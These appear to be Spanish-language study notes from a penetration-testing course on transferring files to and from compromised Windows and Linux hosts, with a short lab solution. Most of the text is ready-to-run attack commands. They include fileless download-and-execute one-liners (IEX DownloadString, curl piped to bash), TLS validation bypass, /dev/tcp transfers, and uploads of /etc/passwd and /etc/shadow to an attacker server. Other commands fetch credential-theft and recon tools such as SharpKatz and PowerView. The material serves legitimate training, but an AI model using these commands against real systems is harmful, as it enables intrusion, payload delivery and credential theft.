## Windows File Transfer Methods

### Descarga de Archivos
**PowerShell Base64 Encode & Decode**
```
#Linux Origen
md5sum id_rsa
cat id_rsa | base64 -w 0; echo

#Windows Destino
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa",[Convert]::FromBase64String("<cadena_base64>"))
Get-FileHash C:\Users\Public\id_rsa -Algorithm MD5

#Es util para payloads pequeños: CMD máx. 8191 caracteres.
```
**PowerShell Web Downloads**

```
#WebClient – File Download (Descarga normal de archivos ya que normalmente el https no es bloqueado en las organizaciones)
(New-Object Net.WebClient).DownloadFile('https://url/file.ps1','C:\Users\Public\file.ps1')
(New-Object Net.WebClient).DownloadFileAsync('https://url/file.ps1','C:\Users\Public\file.ps1')

#WebClient – Fileless (IEX) (Se ejecuta el archivo directamente en memoria, es decir no se almacena)
IEX (New-Object Net.WebClient).DownloadString('https://url/script.ps1')
(New-Object Net.WebClient).DownloadString('https://url/script.ps1') | IEX

#Invoke-WebRequest (iwr, curl, wget) (Bypass de descarga de archivos en caso de bloqueo)
Invoke-WebRequest https://url/file.ps1 -OutFile file.ps1
Invoke-WebRequest https://ip/file.ps1 -UseBasicParsing | IEX

#Bypass SSL/TLS (Por si no se tienen certificados validos)
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### SMB Downloads
```
#Iniciar servidor SMB
sudo impacket-smbserver share -smb2support /tmp/smbshare

#Copia de archivos con windows
copy \\192.168.220.133\share\nc.exe

#Bypass de bloqueo de invitados - Agregandole conexion con credenciales
sudo impacket-smbserver share -smb2support /tmp/smbshare -user User -password Password

net use n: \\192.168.220.133\share /user:User Password
copy n:\nc.exe

```

### FTP Downloads

```
#Crear servidor FTP
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21

#PowerShell Victima Windos
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt','C:\Users\Public\ftp-file.txt')

#Aveces es posible encontrarnos una Shell no interactiva, para ejecutar comandos en estos casos se hace lo siguiente
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt  #-v Verbose, -n Evita conexion automatica con servidor -s:ftpcommand.txt Ejecuta los comandos almacenados
```

### Carga de Archivos (Upload)
**PowerShell Base64 Encode & Decode**
```
#Windows (encode y hash):
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5

#Linux (decode y verificación):
echo <cadena_base64> | base64 -d > hosts
md5sum hosts
```
**PowerShell Web Uploads**
```
#Crear servidor de carga de archivos en "http://<ip>:8000/upload"
pip3 install uploadserver
python3 -m uploadserver

#Windows (PowerShell, subir archivo):
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

#PowerShell Web Uploads en Base 64
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64

#Captura con linux
nc -lvnp 8000
echo <base64> | base64 -d -w 0 > hosts
```
**SMB Upload a Windows**
```
#Iniciar servidor SMB en linux
impacket-smbserver sharefolder /tmp -smb2support
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.128\sharefolder\
```

**SMB Uploads con WebDav**
```
#Iniciar servidor WebDav
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

#Listar y subir archivos a WebDav
dir \\192.168.49.128\DavWWWRoot
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.128\DavWWWRoot\  #Origen por defecto (Si no se especifica se accede a DavWWWRoot)
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.128\sharefolder\
```
**FTP Uploads**
```
#Servidor FTP con escritura
sudo python3 -m pyftpdlib --port 21 --write

#Conexion desde Windows
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts','C:\Windows\System32\drivers\etc\hosts')

#Windows cliente No Interactivo
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```
**Solucion prueba**
```
xfreerdp3 /u:htb-student /p:'HTB_@cademy_stdnt!' /v:10.129.114.10:338

#Se crea el servidor SMB y un directorio llamado "share" compartiendo el directorio actual
sudo impacket-smbserver share -smb2support .

#En PowerShell se copia el archivo compartido
copy \\10.10.16.13\share\upload_win.zip

#Luego se extrae el .txt y se ejecuta hasher
hasher upload_win.txt
f458303ea783c224c6b4e7ef7f17eb9d 
```

____________________________________________________________________________________________________________________

## Linux File Transfer Methods

**Base64 Encoding / Decoding**

**Transferencia de archivos pequeños** - Copiando y Pegando en la terminal el payload encodead
```bash
# Verificar hash original
md5sum id_rsa

# Codificar archivo en Base64
cat id_rsa | base64 -w 0; echo

# Decodificar archivo en el host destino
echo -n '<BASE64>' | base64 -d > id_rsa

# Confirmar hash después de la transferencia
md5sum id_rsa
```

### Descarga de Archivos

```
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh

curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

#Fileless - Sin archivos (Ejecucion directa en memoria)

curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash

wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```
> Siempre que esté instalada la versión Bash 2.04 o superior (compilada con --enable-net-redirections), el archivo de dispositivo/dev/TCP integrado se puede utilizar para descargas de archivos simples.
```
# Establecer conexión TCP
exec 3<>/dev/tcp/10.10.10.32/80

# Enviar petición HTTP
echo -e "GET /LinEnum.sh HTTP/1.1\n\n" >&3

# Leer respuesta
cat <&3
```

**SCP Download** (Secure Copi) a traves de SSH
```
scp plaintext@192.168.49.128:/root/myroot.txt .
scp User@<Remote IP o DNS>:/ruta/archivo.txt Directorio de Guardado

#Puede ser necesario iniciar el servicio SSH en nuestra maquina atacante
sudo systemctl enable ssh
sudo systemctl start ssh
netstat -lnpt  #Comprobacion del puerto de escucha
```

### Carga de Archivos

**Web Upload con uploadserver**
```
# Instalar módulo
sudo python3 -m pip install --user uploadserver

# Crear certificado autofirmado
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

# Iniciar servidor HTTPS
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

# Subir archivos desde máquina comprometida
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

**Web Server alternativo**
```
# Python3
python3 -m http.server 8000

# Python2.7
python2.7 -m SimpleHTTPServer 8000

# PHP
php -S 0.0.0.0:8000

# Ruby
ruby -run -ehttpd . -p8000


#Descargar archivo desde el servidor alternativo
wget 192.168.49.128:8000/filetotransfer.txt
```

**SCP Upload** Si la victima permite conexiones salientes

```
scp /etc/passwd User@10.129.86.90:/home/User/
```


_____________________________________________________________________________

## Transferring Files with Code

**Transferencia de Archivos con comandos Python**
```python
#Python2
python2.7 -c 'import urllib;urllib.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh","LinEnum.sh")'

#Python3
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh","LinEnum.sh")'

#Pyhton3 (Con Rquest)
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

**Tranferencia de Archivos**
```php
#PHP Download with file_get_contents() - Se descarga el contenido de un archivo (file_get_contents) y se almacena en un directorio (file_put_contents) y se ejecuta en la misma linea de comando (-r)
php -r '$file=file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh");file_put_contents("LinEnum.sh",$file);'

#PHP Download with fopen() - Con el modulo fopen se abre la url, descarga y guarda el contenido de esta 
php -r 'const BUFFER=1024;$fremote=fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh","rb");$flocal=fopen("LinEnum.sh","wb");while($buffer=fread($fremote,BUFFER)){fwrite($flocal,$buffer);}fclose($flocal);fclose($fremote);'

#PHP Fileless (pipe to bash) - Se ejecuta Filess
php -r '$lines=@file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh");foreach($lines as $line){echo $line;}' | bash
```
**Ruby** (-e --> Ejecuciòn de comandos)
```Ruby
ruby -e 'require "net/http";File.write("LinEnum.sh",Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```
**Perl**
```
perl -e 'use LWP::Simple;getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh","LinEnum.sh");'
```
**JavaScript (Windows)**
```JavaScript
#Creando un archivo llamado wget.js
var WinHttpReq=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET",WScript.Arguments(0),false);
WinHttpReq.Send();
BinStream=new ActiveXObject("ADODB.Stream");
BinStream.Type=1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));

#Ejecutando wget.js
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```
**VBScript (Windows)**
```VBScript
#Creando archivo wget.vbs
dim xHttp:Set xHttp=createobject("Microsoft.XMLHTTP")
dim bStrm:Set bStrm=createobject("Adodb.Stream")
xHttp.Open "GET",WScript.Arguments.Item(0),False
xHttp.Send
with bStrm
    .type=1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1),2
end with

#Ejecutando script
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

**Operaciones de carga usando Python3**
> Apovechando que desde python se pueden usar todos los metodos http
```
python3 -m uploadserver
python3 -c 'import requests;requests.post("http://<IPVictima>192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'

#Funcionamiento

  # To use the requests function, we need to import the module first.
import requests 

  # Define the target URL where we will upload the file.
URL = "http://192.168.49.128:8000/upload"

  # Define the file we want to read, open it and save it in a variable.
file = open("/etc/passwd","rb")

  # Use a requests POST request to upload the file. 
r = requests.post(url,files={"files":file})
```
____________________________________________________________

##  Miscellaneous File Transfer Methods

### Netcat / Ncat
**Compromised Machine - Listener** Recibir archivo
```
#Original Netcat de la maquina victima
nc -l -p 8000 > SharpKatz.exe

#Ncat (cerrar conexión automáticamente al transferir el archivo)
ncat -l -p 8000 --recv-only > SharpKatz.exe
```
**Attack Host - Send File** Enviar archivo
```
#Original Netcat - Cierra la conexion al terminar de enviar el archivo con "-q 0"
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
nc -q 0 192.168.49.128 8000 < SharpKatz.exe

#Ncat - Cierra la conexion al terminar de enviar el archivo con "--send-only"
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```
**Reverse Direction (Firewall Bypass)**
```
#Attack Host Listener - Maquina atacante envia archivo por puerto 443
sudo nc -l -p 443 -q 0 < SharpKatz.exe
sudo ncat -l -p 443 --send-only < SharpKatz.exe

#Compromised Machine Receiver - Se recibe el archivo por el 443
nc 192.168.49.128 443 > SharpKatz.exe
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```
**Using /dev/tcp (sin nc/ncat instalado)**
> En caso de no tener Netcat o Ncat, Bash admite operaciones de lectura/escritura en un archivo de pseudodispositivo /dev/TCP/. Escribir en este archivo en particular hace que Bash abra una conexión TCP a host:port, y esta función se puede utilizar para transferencias de archivos
```
#Maquina atacante (Envio normal con nc o ncat)
#Compromised Machine recibe archivo con dev/tcp
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

### PowerShell Remoting (WinRM)
> En caso de que HTTP, HTTPS o SSH no esten disponibles
> Para crear una sesión remota de PowerShell en una computadora remota, necesitaremos acceso administrativo, ser miembro del grupo Remote Management Users o tener permisos explícitos para PowerShell Remoting en la configuración de la sesión

**Conexion de DC01 a DATABASE01** (Todo desde la PowerShell)

```PS
#Se testea la conexion al puerto de WinRM
Test-NetConnection -ComputerName DATABASE01 -Port 5985

#Se crea una sesion (Si no se tienen privilegios sobre la cuenta DATABASE01, tocaria ingresar las credenciales)
$Session = New-PSSession -ComputerName DATABASE01

#Se puede copiar un archivo de la maquina local DC01 a la victima usando el cmdlet 
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\

# Archivo remoto a maquina local
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

### RDP File Transfer

**Montar un Directorio Compartido**
```
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'

xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
  - /drive:<NombreDeDirectorioCompartido (Cualquiera)>,<RutaLocalQueSeQuiereCompartir>

Network > \\tsclient\\linux > AccesoAArchivosCompartidos

#Se puede usar el nativo mstsc.exe de Windows
```  




























